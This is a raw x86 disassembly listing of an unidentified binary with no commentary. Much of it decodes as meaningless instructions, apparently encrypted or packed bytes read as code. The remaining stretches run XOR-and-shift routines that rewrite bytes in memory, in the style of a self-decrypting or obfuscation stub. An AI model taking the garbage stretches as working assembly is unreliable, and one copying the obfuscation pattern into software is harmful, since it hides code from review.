  40948c:	scas   al,BYTE PTR es:[edi]
  40948d:	add    dl,BYTE PTR [ecx+0xb]
  409490:	call   0x58a44138
  409495:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409496:	ins    BYTE PTR es:[edi],dx
  409497:	mov    ebp,0x16d00cd4
  40949c:	push   0xffffffca
  40949e:	cmc    
  40949f:	xchg   ebx,eax
  4094a0:	push   0xffffffd9
  4094a2:	rcl    BYTE PTR [esi-0x41d9d52d],cl
  4094a8:	inc    esi
  4094a9:	jle    0x4094cb
  4094ab:	jmp    0x506c:0xc811698c
  4094b2:	xchg   esi,eax
  4094b3:	repz jno 0x409449
  4094b6:	lods   eax,DWORD PTR ss:[esi]
  4094b8:	add    dl,BYTE PTR [esi+esi*8+0x5e]
  4094bc:	dec    edi
  4094bd:	add    al,0x3e
  4094bf:	mul    BYTE PTR [ebp-0x36064e07]
  4094c5:	sbb    bl,BYTE PTR [edi-0x3acf983d]
  4094cb:	jbe    0x40950c
  4094cd:	pop    ebp
  4094ce:	and    edi,DWORD PTR [ecx]
  4094d0:	in     al,dx
  4094d1:	pop    edi
  4094d2:	pop    eax
  4094d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094d4:	out    dx,eax
  4094d5:	xor    BYTE PTR [edx-0xf0384f4],0x0
  4094dc:	jp     0x409495
  4094de:	push   ecx
  4094df:	xor    eax,0x96debb5d
  4094e4:	mov    esp,0xa78b20c7
  4094e9:	sbb    BYTE PTR [ebp-0x251f6c7f],bl
  4094ef:	fistp  QWORD PTR [esi-0x4b]
  4094f2:	add    ch,BYTE PTR [edx]
  4094f4:	leave  
  4094f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094f6:	repz mov bl,0x3d
  4094f9:	fldenv [ecx+0x23]
  4094fc:	loop   0x409496
  4094fe:	test   al,0x6b
  409500:	shr    edi,cl
  409502:	cmp    bh,BYTE PTR [edi-0xf07b8af]
  409508:	cmp    al,0xe0
  40950a:	mov    bh,0xad
  40950c:	ret    0x5612
  40950f:	stos   BYTE PTR es:[edi],al
  409510:	pop    esi
  409511:	push   cs
  409512:	push   ecx
  409513:	rcr    bh,1
  409515:	push   ecx
  409516:	lahf   
  409517:	fisubr WORD PTR [ebp+0x38191449]
  40951d:	mov    al,ds:0x82175e1a
  409522:	fisubr DWORD PTR [ebp-0x64]
  409525:	jne    0x409518
  409527:	add    eax,0x89a7cd06
  40952c:	push   0x3c5f597e
  409531:	xchg   edx,eax
  409532:	xchg   esp,eax
  409533:	push   0x2d07e28d
  409538:	clc    
  409539:	inc    ebx
  40953a:	add    eax,0x4f219411
  40953f:	pusha  
  409540:	push   cs
  409541:	loope  0x4095a1
  409543:	(bad)  
  409544:	fsubr  QWORD PTR [eax+ebx*8+0x43]
  409548:	cmp    BYTE PTR [ebp+0xabac197],cl
  40954e:	or     BYTE PTR [esi+0x4d6e6b22],0xb
  409555:	fidiv  DWORD PTR [ebx-0x7e261a29]
  40955b:	inc    ebp
  40955c:	shl    BYTE PTR [edx+0x229cec8e],1
  409562:	or     eax,0x3b0bd3f7
  409567:	or     dl,ah
  409569:	das    
  40956a:	int3   
  40956b:	pop    ebp
  40956c:	cmc    
  40956d:	pop    edi
  40956e:	shl    DWORD PTR [ecx-0x14a867c5],1
  409574:	cdq    
  409575:	mov    edi,cs
  409577:	xlat   BYTE PTR ds:[ebx]
  409578:	mov    ah,0xf4
  40957a:	add    eax,0xcad895c7
  40957f:	popf   
  409580:	sub    DWORD PTR [ebp+0x6a],eax
  409583:	scas   al,BYTE PTR es:[edi]
  409584:	pop    esp
  409585:	or     eax,0x70c1da9
  40958a:	fist   WORD PTR [edi+0x335e43a9]
  409590:	ret    
  409591:	lock xor DWORD PTR [edi+0x6a0b5af5],ebx
  409598:	push   0x8a2fa1db
  40959d:	mov    WORD PTR [edx-0x33dd90a6],cs
  4095a3:	lds    ebp,FWORD PTR [ebp+0x67]
  4095a6:	test   bh,0xa6
  4095a9:	add    DWORD PTR [edx+0x46],ebp
  4095ac:	pop    es
  4095ad:	push   ebp
  4095ae:	push   ss
  4095af:	pop    eax
  4095b0:	jl     0x40953f
  4095b2:	cld    
  4095b3:	and    DWORD PTR [eax+0x54970711],edi
  4095b9:	shl    bh,cl
  4095bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095bc:	or     eax,0x75dc9b99
  4095c1:	scas   eax,DWORD PTR es:[edi]
  4095c2:	pop    edx
  4095c3:	mov    edx,0xd977eadd
  4095c8:	gs mov ch,0xf
  4095cb:	cmp    BYTE PTR [edx-0x33],bh
  4095ce:	int    0x67
  4095d0:	push   esp
  4095d1:	out    0xc4,eax
  4095d3:	aad    0x98
  4095d5:	pop    edi
  4095d6:	ja     0x409631
  4095d8:	push   esp
  4095d9:	or     bl,BYTE PTR [esi]
  4095db:	sub    DWORD PTR [ebx+ebx*1-0x70],0x30
  4095e0:	or     eax,0x9e028cac
  4095e5:	fs ret 0x7cf8
  4095e9:	into   
  4095ea:	js     0x4095af
  4095ec:	and    DWORD PTR [ebp+0x1fb98ab9],ebx
  4095f2:	pop    esp
  4095f3:	inc    ecx
  4095f4:	pop    ecx
  4095f5:	cmp    al,0x9b
  4095f7:	stc    
  4095f8:	add    al,0x65
  4095fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095fb:	pop    ds
  4095fc:	xchg   ebx,eax
  4095fd:	or     eax,0x38b3b6cc
  409602:	div    DWORD PTR [ebx+0x12]
  409605:	dec    esp
  409606:	leave  
  409607:	xchg   ecx,eax
  409608:	mov    ds:0x4da7a110,eax
  40960d:	sbb    ebx,ebx
  40960f:	cwde   
  409610:	shl    DWORD PTR [esi+0x53f1acc6],cl
  409616:	(bad)  
  409617:	repz cmp cl,BYTE PTR [ebp-0x77fed387]
  40961e:	ins    BYTE PTR es:[edi],dx
  40961f:	mov    bh,0x6e
  409621:	inc    edi
  409622:	fidiv  DWORD PTR [ebp+ebx*1-0x23]
  409626:	push   ds
  409627:	push   ecx
  409628:	or     ecx,DWORD PTR [esi+0x6]
  40962b:	mov    edx,DWORD PTR [esi]
  40962d:	shl    eax,0x2
  409630:	mov    DWORD PTR [ebp+0x10],edx
  409633:	mov    edx,DWORD PTR [esi+0x4]
  409636:	xor    eax,0xca79a575
  40963b:	mov    DWORD PTR [ebp+0x14],edx
  40963e:	cmp    eax,DWORD PTR [ebp+0x10]
  409641:	jne    0x4096f4
  409647:	mov    eax,edx
  409649:	cmp    DWORD PTR [ebp+0xc],eax
  40964c:	jne    0x4096f4
  409652:	mov    eax,DWORD PTR [esi]
  409654:	mov    edx,DWORD PTR [esi+0x4]
  409657:	mov    eax,DWORD PTR [esi]
  409659:	mov    edx,DWORD PTR [esi+0x4]
  40965c:	xor    eax,0xca79a577
  409661:	xor    edx,ecx
  409663:	mov    ecx,eax
  409665:	mov    eax,edx
  409667:	shrd   ecx,eax,0x2
  40966b:	shr    eax,0x2
  40966e:	mov    DWORD PTR [ebp+0xc],eax
  409671:	mov    eax,DWORD PTR [esi]
  409673:	mov    edx,DWORD PTR [esi+0x4]
  409676:	mov    edx,eax
  409678:	xor    eax,eax
  40967a:	or     eax,ecx
  40967c:	mov    ecx,DWORD PTR [ebx]
  40967e:	shl    edx,0x1e
  409681:	xor    edx,0x40000000
  409687:	mov    DWORD PTR [ebp+0x10],eax
  40968a:	mov    eax,edx
  40968c:	or     eax,DWORD PTR [ebp+0xc]
  40968f:	mov    edx,DWORD PTR [ebx+0x4]
  409692:	push   eax
  409693:	push   DWORD PTR [ebp+0x10]
  409696:	push   edx
  409697:	push   ecx
  409698:	call   0x416c20
  40969d:	mov    eax,DWORD PTR [esi]
  40969f:	mov    ecx,DWORD PTR [esi+0x4]
  4096a2:	shrd   eax,ecx,0x2
  4096a6:	shr    ecx,0x2
  4096a9:	shr    edx,0x1e
  4096ac:	xor    ecx,0xe706e27a
  4096b2:	push   ecx
  4096b3:	xor    eax,edi
  4096b5:	mov    DWORD PTR [ebp+0x10],edx
  4096b8:	mov    edx,DWORD PTR [ebx]
  4096ba:	mov    edi,DWORD PTR [ebx+0x4]
  4096bd:	push   eax
  4096be:	push   edi
  4096bf:	push   edx
  4096c0:	call   0x416c20
  4096c5:	shld   edx,eax,0x2
  4096c9:	mov    ecx,edx
  4096cb:	xor    edx,edx
  4096cd:	or     ecx,edx
  4096cf:	mov    edx,DWORD PTR [esi]
  4096d1:	mov    edi,DWORD PTR [esi+0x4]
  4096d4:	shl    eax,0x2
  4096d7:	or     eax,DWORD PTR [ebp+0x10]
  4096da:	xor    edi,ecx
  4096dc:	xor    edx,eax
  4096de:	xor    edx,0xca79a575
  4096e4:	xor    edi,0x9c1b89e8
  4096ea:	mov    DWORD PTR [esi],edx
  4096ec:	mov    DWORD PTR [esi+0x4],edi
  4096ef:	jmp    0x40a921
  4096f4:	mov    eax,DWORD PTR [ebp-0x24]
  4096f7:	add    eax,DWORD PTR [ebp-0x4]
  4096fa:	mov    DWORD PTR [ebp-0x28],eax
  4096fd:	mov    eax,DWORD PTR [ebp-0x28]
  409700:	mov    eax,DWORD PTR [ebp-0x4]
  409703:	mov    eax,DWORD PTR [ebp-0x28]
  409706:	mov    eax,DWORD PTR [eax+0xc]
  409709:	mov    edx,DWORD PTR [ebp-0x4]
  40970c:	movzx  eax,WORD PTR [edx+eax*1]
  409710:	cdq    
  409711:	shld   edx,eax,0x2
  409715:	xor    edx,ecx
  409717:	mov    DWORD PTR [ebp+0xc],edx
  40971a:	mov    edx,DWORD PTR [ebp-0x58]
  40971d:	shl    eax,0x2
  409720:	mov    DWORD PTR [ebp+0x10],edx
  409723:	mov    edx,DWORD PTR [ebp-0x54]
  409726:	xor    eax,0xca79a575
  40972b:	mov    DWORD PTR [ebp+0x14],edx
  40972e:	cmp    eax,DWORD PTR [ebp+0x10]
  409731:	jne    0x40a0d1
  409737:	mov    eax,edx
  409739:	cmp    DWORD PTR [ebp+0xc],eax
  40973c:	jne    0x40a0d1
  409742:	mov    DWORD PTR [ebp+0x8],0xca79a575
  409749:	mov    DWORD PTR [ebp+0xc],ecx
  40974c:	mov    DWORD PTR [ebp-0x60],0xca79a571
  409753:	mov    DWORD PTR [ebp-0x5c],ecx
  409756:	mov    DWORD PTR [ebp-0x48],0xca79a57d
  40975d:	mov    DWORD PTR [ebp-0x44],ecx
  409760:	mov    DWORD PTR [ebp-0x38],0xca79a579
  409767:	mov    DWORD PTR [ebp-0x34],ecx
  40976a:	mov    eax,DWORD PTR [ebp+0x8]
  40976d:	mov    ecx,DWORD PTR [ebp+0xc]
  409770:	shrd   eax,ecx,0x2
  409774:	shr    ecx,0x2
  409777:	mov    ecx,DWORD PTR [ebp+0x8]
  40977a:	mov    edx,DWORD PTR [ebp+0xc]
  40977d:	xor    eax,edi
  40977f:	shl    ecx,0x1e
  409782:	xor    edx,edx
  409784:	or     eax,edx
  409786:	add    eax,DWORD PTR ds:0x4225e8
  40978c:	mov    DWORD PTR [ebp+0x14],eax
  40978f:	mov    eax,DWORD PTR [ebp+0x8]
  409792:	mov    ecx,DWORD PTR [ebp+0xc]
  409795:	shrd   eax,ecx,0x2
  409799:	shr    ecx,0x2
  40979c:	mov    ecx,DWORD PTR [ebp+0x8]
  40979f:	mov    edx,DWORD PTR [ebp+0xc]
  4097a2:	xor    eax,edi
  4097a4:	shl    ecx,0x1e
  4097a7:	xor    edx,edx
  4097a9:	or     eax,edx
  4097ab:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  4097af:	mov    eax,DWORD PTR [ebp+0x14]
  4097b2:	xor    BYTE PTR [eax],cl
  4097b4:	mov    eax,DWORD PTR [ebp-0x60]
  4097b7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4097ba:	shrd   eax,ecx,0x2
  4097be:	shr    ecx,0x2
  4097c1:	mov    ecx,DWORD PTR [ebp-0x60]
  4097c4:	mov    edx,DWORD PTR [ebp-0x5c]
  4097c7:	xor    eax,edi
  4097c9:	shl    ecx,0x1e
  4097cc:	jmp    0x409baa
  4097d1:	or     bh,dh
  4097d3:	cmp    BYTE PTR [esi-0x6574e1dc],dh
  4097d9:	mov    esi,0xbdbca5c6
  4097de:	mov    eax,ds:0x4147aa25
  4097e3:	sbb    BYTE PTR [eax],bl
  4097e5:	sahf   
  4097e6:	adc    bl,BYTE PTR [eax]
  4097e8:	sbb    al,dh
  4097ea:	cmp    eax,0xe426273c
  4097ef:	(bad)  
  4097f0:	popf   
  4097f1:	jno    0x409803
  4097f3:	in     eax,0x29
  4097f5:	sub    esp,ebx
  4097f7:	sub    BYTE PTR [ecx-0x5f820c90],ah
  4097fd:	in     al,0xcc
  4097ff:	loop   0x409844
  409801:	test   eax,0xe3773a4b
  409806:	fistp  QWORD PTR [ecx-0x3b]
  409809:	cld    
  40980a:	add    ch,BYTE PTR [ebx-0x7a]
  40980d:	sbb    bl,dl
  40980f:	into   
  409810:	inc    eax
  409811:	or     al,0xe5
  409813:	shl    DWORD PTR [ebx-0x949737d],cl
  409819:	pop    ebp
  40981a:	or     BYTE PTR [edi+eax*1-0x29],cl
  40981e:	push   edi
  40981f:	add    esp,DWORD PTR [ecx-0x9]
  409822:	xor    al,0x95
  409824:	and    dl,dl
  409826:	and    ch,BYTE PTR [esi]
  409828:	mov    al,ds:0xfce7ba97
  40982d:	(bad)  
  40982e:	push   eax
  40982f:	push   ecx
  409830:	xchg   ebx,eax
  409831:	dec    esp
  409832:	mov    dl,0x3d
  409834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409835:	push   ss
  409836:	idiv   DWORD PTR [edi+0x7d]
  409839:	fisttp QWORD PTR [esi-0x24bd7a56]
  40983f:	das    
  409840:	into   
  409841:	inc    esp
  409842:	cmp    eax,0x457a6820
  409847:	mov    dl,0x49
  409849:	cmp    DWORD PTR [edi+0x20bc4f4],esi
  40984f:	test   al,0x9d
  409851:	fisub  DWORD PTR [edx-0x4301d23c]
  409857:	push   edx
  409858:	jbe    0x409823
  40985a:	xchg   edx,eax
  40985b:	pop    edx
  40985c:	(bad)  
  40985d:	iret   
  40985e:	clc    
  40985f:	mov    eax,0x843e8d52
  409864:	scas   eax,DWORD PTR es:[edi]
  409865:	cmp    BYTE PTR [eax-0x153c199a],ch
  40986b:	pusha  
  40986c:	mov    bh,0xb3
  40986e:	inc    esi
  40986f:	shl    BYTE PTR [esi+0x5dd56c6f],1
  409875:	or     dh,0xac
  409878:	mov    ch,0x73
  40987a:	push   cs
  40987b:	and    cl,BYTE PTR [ecx+edx*1+0x23]
  40987f:	jo     0x4098f0
  409881:	std    
  409882:	aaa    
  409883:	loop   0x4098c2
  409885:	imul   esi,DWORD PTR [ecx+0x6b],0xffffffc3
  409889:	retf   0xe53e
  40988c:	sub    BYTE PTR [esi*8+0x2fc8a269],ch
  409893:	fisubr DWORD PTR ds:0x1a1af770
  409899:	sbb    eax,0x8f25323f
  40989e:	(bad)  
  40989f:	sbb    WORD PTR [eax],0x1b
  4098a3:	mov    ecx,0x553801a6
  4098a8:	and    al,0xfd
  4098aa:	sbb    eax,0x6e7d45b3
  4098af:	sbb    esi,ebp
  4098b1:	(bad)  
  4098b2:	mov    ebp,0xd63a3d49
  4098b7:	jp     0x40992b
  4098b9:	pop    es
  4098ba:	outs   dx,DWORD PTR ds:[esi]
  4098bb:	jmp    0xc4db7ead
  4098c0:	add    DWORD PTR [edx+0x8eca19b],esi
  4098c6:	pop    ds
  4098c7:	call   0xf5bc:0xcb14dcbc
  4098ce:	pop    ss
  4098cf:	or     ebp,DWORD PTR [edx]
  4098d1:	sbb    ah,bh
  4098d3:	jl     0x409908
  4098d5:	pop    ds
  4098d6:	cmp    eax,0x595dca34
  4098db:	outs   dx,DWORD PTR ds:[esi]
  4098dc:	sub    edx,DWORD PTR [edx]
  4098de:	enter  0x26aa,0x4d
  4098e2:	sub    ecx,esp
  4098e4:	push   edx
  4098e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098e6:	and    al,0x56
  4098e8:	cmp    BYTE PTR ds:0x1c7e904,bh
  4098ee:	pushf  
  4098ef:	add    ecx,ebx
  4098f1:	pop    es
  4098f2:	jl     0x4098da
  4098f4:	jp     0x409892
  4098f6:	js     0x4098b1
  4098f8:	(bad)  
  4098f9:	sahf   
  4098fa:	imul   edx,DWORD PTR [ebp-0x6b835641],0xffffffd5
  409901:	stc    
  409902:	inc    ebx
  409903:	pop    esp
  409904:	push   0xe2eabcd9
  409909:	sub    eax,0x86b0e8a8
  40990e:	xor    dh,dh
  409910:	xchg   ecx,eax
  409911:	repz jno 0x40995d
  409914:	mov    ds:0xb6ecd131,eax
  409919:	cld    
  40991a:	mov    edi,0xbcc42ada
  40991f:	xchg   esi,eax
  409920:	push   esp
  409921:	sbb    edx,ebx
  409923:	loopne 0x4098f7
  409925:	xchg   ebx,eax
  409926:	and    al,0x51
  409928:	int    0x48
  40992a:	enter  0x4838,0xc3
  40992e:	shl    BYTE PTR ds:0xd750c4e1,1
  409934:	shl    DWORD PTR [ebx+0x181cf6c8],0x48
  40993b:	cmp    al,0xba
  40993d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40993e:	out    0x13,al
  409940:	repz sub dh,BYTE PTR [ebp-0x4e]
  409944:	pop    edi
  409945:	xchg   esp,eax
  409946:	mov    cl,0x39
  409948:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409949:	mov    ch,BYTE PTR [edx-0x52]
  40994c:	sahf   
  40994d:	inc    esi
  40994e:	dec    edx
  40994f:	mov    esp,edi
  409951:	data16 fwait
  409953:	(bad)  
  409954:	xchg   ecx,eax
  409955:	and    ecx,DWORD PTR [ecx]
  409957:	ds leave 
  409959:	pop    edx
  40995a:	jbe    0x4099cd
  40995c:	cmp    eax,0xbf19f038
  409961:	pop    eax
  409962:	push   edx
  409963:	and    eax,0xd1b0ee6c
  409968:	sub    dh,cl
  40996a:	mov    ch,0xa2
  40996c:	xchg   edi,eax
  40996d:	sub    BYTE PTR [ebp+0x38],0xc
  409971:	cmp    cl,BYTE PTR [ebx-0xb]
  409974:	push   0x4d
  409976:	pop    edx
  409977:	(bad)
  40997a:	inc    edi
  40997b:	adc    ch,BYTE PTR [esi-0x30]
  40997e:	push   ebp
  40997f:	idiv   DWORD PTR [ecx+eiz*8-0x5c]
  409983:	jl     0x4099b0
  409985:	mov    edx,0x180fc619
  40998a:	sbb    DWORD PTR [ebx],ebx
  40998c:	lods   al,BYTE PTR ds:[esi]
  40998d:	xor    BYTE PTR [edi-0xe174631],dh
  409993:	ins    DWORD PTR es:[edi],dx
  409994:	mov    ebp,0x9f459677
  409999:	fidivr WORD PTR [esi+0x19]
  40999c:	fsubr  QWORD PTR [esi+0x76]
  40999f:	sti    
  4099a0:	mov    ch,0x1
  4099a2:	cli    
  4099a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099a4:	fwait
  4099a5:	sar    BYTE PTR [ecx+0x66136085],cl
  4099ab:	push   edx
  4099ac:	std    
  4099ad:	iret   
  4099ae:	aad    0x19
  4099b0:	cmp    ecx,ebp
  4099b2:	xor    eax,0xb23b5b49
  4099b7:	cs mov bh,0x7d
  4099ba:	dec    ecx
  4099bb:	dec    BYTE PTR [edx+0x7a3be709]
  4099c1:	mov    ds:0xd7e20f5f,eax
  4099c6:	xchg   esi,eax
  4099c7:	int3   
  4099c8:	fst    DWORD PTR ds:0x7711322d
  4099ce:	xchg   esi,eax
  4099cf:	or     eax,0xa0058b6
  4099d4:	dec    ecx
  4099d5:	or     bh,BYTE PTR [ebx]
  4099d7:	(bad)  
  4099d8:	mov    ds:0xf3cd57ad,eax
  4099de:	nop
  4099df:	jl     0x409a4a
  4099e1:	ror    BYTE PTR [edi+0x2988f4a7],cl
  4099e7:	repnz in al,0xcd
  4099ea:	xor    edx,DWORD PTR [edi-0x131cce42]
  4099f0:	inc    ebp
  4099f1:	jl     0x409a27
  4099f3:	pop    ecx
  4099f4:	gs ins DWORD PTR es:[edi],dx
  4099f6:	fcmovbe st,st(6)
  4099f8:	dec    edi
  4099f9:	and    al,0xe5
  4099fb:	rcr    ch,1
  4099fd:	lahf   
  4099fe:	out    0x26,al
  409a00:	stos   DWORD PTR es:[edi],eax
  409a01:	mov    ?,WORD PTR [esp+edi*1+0x2fcf10b4]
  409a08:	pop    edi
  409a09:	xor    al,cl
  409a0b:	and    edx,DWORD PTR [edi+0x202b6462]
  409a11:	mov    ebp,0xa859e423
  409a16:	push   ss
  409a17:	scas   eax,DWORD PTR es:[edi]
  409a18:	fnstsw WORD PTR [ebx]
  409a1a:	in     eax,0xc3
  409a1c:	push   edx
  409a1d:	leave  
  409a1e:	pop    ebx
  409a1f:	dec    edi
  409a20:	cmp    edx,esi
  409a22:	push   edx
  409a23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a24:	mov    ebp,0xcb3eced
  409a29:	jmp    0x409aa1
  409a2b:	pop    es
  409a2c:	jg     0x409a4b
  409a2e:	push   0xffffffe6
  409a30:	dec    esp
  409a31:	out    0xbc,al
  409a33:	je     0x409a0b
  409a35:	push   edi
  409a36:	ret    
  409a37:	pop    esp
  409a38:	cmp    ecx,DWORD PTR [edi+0x3e08bc27]
  409a3e:	(bad)  
  409a3f:	in     eax,0x69
  409a41:	std    
  409a42:	inc    ecx
  409a43:	xchg   esp,eax
  409a44:	xlat   BYTE PTR ds:[ebx]
  409a45:	and    eax,0xa5177a6a
  409a4a:	pop    ebx
  409a4b:	loope  0x409a40
  409a4d:	div    bh
  409a4f:	out    0xa4,eax
  409a51:	cdq    
  409a52:	not    bh
  409a54:	repz lds esp,FWORD PTR [ebx+0x10]
  409a58:	iret   
  409a59:	inc    ebp
  409a5a:	add    DWORD PTR [ebp+0x44],eax
  409a5d:	cs hlt 
  409a5f:	jno    0x409a21
  409a61:	das    
  409a62:	mov    ds:0x54cd1d9f,al
  409a67:	inc    edi
  409a68:	mov    ebp,0xb41d9757
  409a6d:	jge    0x409a8b
  409a6f:	or     dh,BYTE PTR [ebp-0x39]
  409a72:	fdivr  QWORD PTR [ecx-0x1db46b69]
  409a78:	cmp    al,cl
  409a7a:	lahf   
  409a7b:	nop
  409a7c:	inc    esp
  409a7d:	add    eax,0xc5223759
  409a82:	and    eax,0xd3233c6e
  409a87:	imul   edi,ecx,0x3c937e5
  409a8d:	xchg   esp,eax
  409a8e:	xchg   esi,eax
  409a8f:	int    0x2b
  409a91:	ss sahf 
  409a93:	shr    DWORD PTR [ebp+0x2b],1
  409a96:	nop
  409a97:	ins    BYTE PTR es:[edi],dx
  409a98:	adc    bl,ch
  409a9a:	aaa    
  409a9b:	outs   dx,BYTE PTR ds:[esi]
  409a9c:	icebp  
  409a9d:	dec    ebp
  409a9e:	loope  0x409a3b
  409aa0:	adc    eax,0x4ab37e44
  409aa5:	lods   al,BYTE PTR ds:[esi]
  409aa6:	mov    edi,0xdf00ceab
  409aab:	imul   edi,DWORD PTR [esi],0x4d
  409aae:	lock inc ebx
  409ab0:	inc    eax
  409ab1:	xor    BYTE PTR [eax+ecx*2+0x721d28d4],bh
  409ab8:	pop    ss
  409ab9:	aad    0x47
  409abb:	add    al,0x8c
  409abd:	jae    0x409a5b
  409abf:	mov    cl,0xc3
  409ac1:	adc    edi,esi
  409ac3:	pusha  
  409ac4:	fst    QWORD PTR [eax]
  409ac6:	lea    eax,[eax+0x59db2020]
  409acc:	pop    ecx
  409acd:	mov    al,0x27
  409acf:	or     dh,BYTE PTR [edi]
  409ad1:	fcomp  QWORD PTR [edx+ecx*1]
  409ad4:	adc    bh,bl
  409ad6:	sbb    DWORD PTR [ebx],0xffffff9d
  409ad9:	in     eax,0x83
  409adb:	and    ebx,DWORD PTR [eax+0x1855ec77]
  409ae1:	and    ebx,DWORD PTR [esi]
  409ae3:	add    eax,0xe8c13de8
  409ae8:	cdq    
  409ae9:	call   0xc460:0x746f301b
  409af0:	mov    ebx,0x7e7ca0d2
  409af5:	jae    0x409ae6
  409af7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409af8:	push   cs
  409af9:	in     al,0xb
  409afb:	or     cl,0xa2
  409afe:	pop    es
  409aff:	icebp  
  409b00:	loopne 0x409b23
  409b02:	call   DWORD PTR [ecx+0x7599bb77]
  409b08:	cmp    al,0x83
  409b0a:	xchg   ebx,eax
  409b0b:	jecxz  0x409b88
  409b0d:	mov    ds:0x283d267c,eax
  409b12:	jecxz  0x409b88
  409b14:	add    al,0x58
  409b16:	jecxz  0x409aa0
  409b18:	mov    eax,ds:0x4f4cb68a
  409b1d:	aaa    
  409b1e:	out    0x24,eax
  409b20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b21:	ret    0x47d1
  409b24:	xlat   BYTE PTR ds:[ebx]
  409b25:	sub    eax,0x5e078bb6
  409b2a:	adc    BYTE PTR [eax-0x3b],ah
  409b2d:	mov    al,ds:0xe689663b
  409b32:	std    
  409b33:	(bad)
  409b36:	pop    ebp
  409b37:	stos   BYTE PTR es:[edi],al
  409b38:	jmp    0x409b68
  409b3a:	aam    0xd7
  409b3c:	inc    edi
  409b3d:	arpl   WORD PTR [edx],ax
  409b3f:	dec    BYTE PTR [ecx]
  409b41:	je     0x409b48
  409b43:	sbb    DWORD PTR [ecx],0x39
  409b46:	push   ebp
  409b47:	cmp    BYTE PTR [edi+0x1d389ea4],0x49
  409b4e:	adc    ch,0xf2
  409b51:	sub    ah,dl
  409b53:	jns    0x409b91
  409b55:	cli    
  409b56:	dec    ebp
  409b57:	out    dx,al
  409b58:	retf   
  409b59:	mov    esp,0x8b94d979
  409b5e:	call   0xca4a:0xf760c3e4
  409b65:	lock cmp al,0x2a
  409b68:	mov    ds:0x1a3dafc0,eax
  409b6d:	shl    bh,1
  409b6f:	cmp    BYTE PTR [eax+0x542bc178],bh
  409b75:	and    ah,ah
  409b77:	ror    DWORD PTR [edi+0x29],cl
  409b7a:	mov    ecx,0x88b237e9
  409b7f:	xor    edx,DWORD PTR [ebx]
  409b81:	fnsave [edx]
  409b83:	jb     0x409bb6
  409b85:	cdq    
  409b86:	jl     0x409b5b
  409b88:	rcl    BYTE PTR [edx-0x45],1
  409b8b:	push   cs
  409b8c:	mov    al,0xb2
  409b8e:	pop    eax
  409b8f:	push   es
  409b90:	dec    ecx
  409b91:	pop    eax
  409b92:	pop    eax
  409b93:	jmp    0x9f2a05dc
  409b98:	mov    ch,0xcf
  409b9a:	sbb    BYTE PTR [esi+0x24],bh
  409b9d:	inc    edx
  409b9e:	xor    DWORD PTR [esi+0x17],eax
  409ba1:	nop
  409ba2:	(bad)  
  409ba4:	mov    eax,ds:0xd093d895
  409ba9:	inc    esp
  409baa:	xor    edx,edx
  409bac:	or     eax,edx
  409bae:	add    eax,DWORD PTR ds:0x4225e8
  409bb4:	mov    DWORD PTR [ebp+0x14],eax
  409bb7:	mov    eax,DWORD PTR [ebp-0x60]
  409bba:	mov    ecx,DWORD PTR [ebp-0x5c]
  409bbd:	shrd   eax,ecx,0x2
  409bc1:	shr    ecx,0x2
  409bc4:	mov    ecx,DWORD PTR [ebp-0x60]
  409bc7:	mov    edx,DWORD PTR [ebp-0x5c]
  409bca:	xor    eax,edi
  409bcc:	shl    ecx,0x1e
  409bcf:	xor    edx,edx
  409bd1:	or     eax,edx
  409bd3:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409bd7:	mov    eax,DWORD PTR [ebp+0x14]
  409bda:	or     BYTE PTR [eax],cl
  409bdc:	mov    eax,DWORD PTR [ebp-0x48]
  409bdf:	mov    ecx,DWORD PTR [ebp-0x44]
  409be2:	shrd   eax,ecx,0x2
  409be6:	shr    ecx,0x2
  409be9:	mov    ecx,DWORD PTR [ebp-0x48]
  409bec:	mov    edx,DWORD PTR [ebp-0x44]
  409bef:	xor    eax,edi
  409bf1:	xor    edx,edx
  409bf3:	or     eax,edx
  409bf5:	add    eax,DWORD PTR ds:0x4225e8
  409bfb:	shl    ecx,0x1e
  409bfe:	mov    DWORD PTR [ebp+0x14],eax
  409c01:	mov    eax,DWORD PTR [ebp-0x48]
  409c04:	mov    ecx,DWORD PTR [ebp-0x44]
  409c07:	shrd   eax,ecx,0x2
  409c0b:	shr    ecx,0x2
  409c0e:	mov    ecx,DWORD PTR [ebp-0x48]
  409c11:	mov    edx,DWORD PTR [ebp-0x44]
  409c14:	xor    eax,edi
  409c16:	shl    ecx,0x1e
  409c19:	xor    edx,edx
  409c1b:	or     eax,edx
  409c1d:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409c21:	mov    eax,DWORD PTR [ebp+0x14]
  409c24:	add    BYTE PTR [eax],cl
  409c26:	mov    eax,DWORD PTR [ebp-0x38]
  409c29:	mov    ecx,DWORD PTR [ebp-0x34]
  409c2c:	shrd   eax,ecx,0x2
  409c30:	shr    ecx,0x2
  409c33:	mov    ecx,DWORD PTR [ebp-0x38]
  409c36:	mov    edx,DWORD PTR [ebp-0x34]
  409c39:	xor    edx,edx
  409c3b:	xor    eax,edi
  409c3d:	or     eax,edx
  409c3f:	add    eax,DWORD PTR ds:0x4225e8
  409c45:	shl    ecx,0x1e
  409c48:	mov    ecx,DWORD PTR [ebp-0x38]
  409c4b:	mov    edx,DWORD PTR [ebp-0x34]
  409c4e:	shrd   ecx,edx,0x2
  409c52:	xor    ecx,edi
  409c54:	shr    edx,0x2
  409c57:	mov    edx,DWORD PTR [ebp-0x38]
  409c5a:	mov    edi,DWORD PTR [ebp-0x34]
  409c5d:	xor    edi,edi
  409c5f:	or     ecx,edi
  409c61:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  409c65:	or     BYTE PTR [eax],cl
